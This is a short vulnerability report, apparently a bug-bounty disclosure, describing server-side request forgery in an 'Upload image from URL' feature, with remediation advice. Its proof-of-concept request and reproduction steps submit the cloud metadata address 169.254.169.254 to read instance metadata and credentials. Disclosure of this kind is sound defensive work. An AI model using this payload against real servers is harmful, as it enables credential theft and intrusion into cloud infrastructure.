# SSRF via “Upload Image from URL” Feature

## Description
The “Upload image from URL” feature accepts arbitrary URLs and does not block access to internal services. This enables **Server-Side Request Forgery (SSRF)**.

## Proof of Concept
```
POST /exp.php HTTP/2
Host: example.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

url=http://169.254.169.254/latest/meta-data/
```

## Steps to Reproduce
1. Open the “Upload image from URL” feature.
2. Submit:
   ```
   http://169.254.169.254/latest/meta-data/
   ```
3. Observe the response indicating access to metadata.

## Impact
Attackers can access internal services (e.g., AWS metadata) and extract credentials or sensitive configuration.

## Recommendation
- Block requests to private, loopback, and metadata IP ranges.
- Enforce strict allowlists for external URLs.
- Perform DNS resolution and IP checks **server-side**.
